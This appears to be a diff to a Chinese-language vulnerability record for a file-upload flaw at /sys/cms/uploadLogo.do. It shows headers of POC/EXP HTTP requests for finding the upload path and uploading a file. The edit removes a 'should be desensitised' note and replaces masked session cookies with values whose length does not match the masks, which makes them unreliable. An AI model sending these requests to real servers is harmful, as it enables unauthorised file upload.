@@ -35,7 +35,7 @@ schema_version: "1"
 
 以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。
 
-- 硬编码路径/不同session/编码说明缺失；应脱敏并补动态取路径逻辑
+- 硬编码路径/不同session/编码说明缺失；需补动态取路径逻辑
 - hello JSP解析证据只图，需文本；缺修复build
 
 ## 操作风险
@@ -89,7 +89,7 @@ POC/EXP：获取文件上传路径
 POST /sys/cms/uploadLogo.do?b_upload=upload&isClose=2&type=1 HTTP/1.1
 Host: 127.0.0.1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
-Cookie: JSESSIONID=3******************************3
+Cookie: JSESSIONID=3199B98D03
 Content-Type:multipart/form-data; boundary=----WebKitFormBoundaryfjKBvGWJbG07Z02r
 
 ------WebKitFormBoundaryfjKBvGWJbG07Z02r
@@ -123,7 +123,7 @@ POC/EXP：文件上传
 POST /sys/cms/uploadLogo.do?b_upload=upload&isClose=2&type=1 HTTP/1.1
 Host: 127.0.0.1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
-Cookie: JSESSIONID=1******************************0
+Cookie: JSESSIONID=163CC9FFC3CAAEAFCF0
 Content-Type:multipart/form-data; boundary=----WebKitFormBoundaryfjKBvGWJbG07Z02r
 
 ------WebKitFormBoundaryfjKBvGWJbG07Z02r
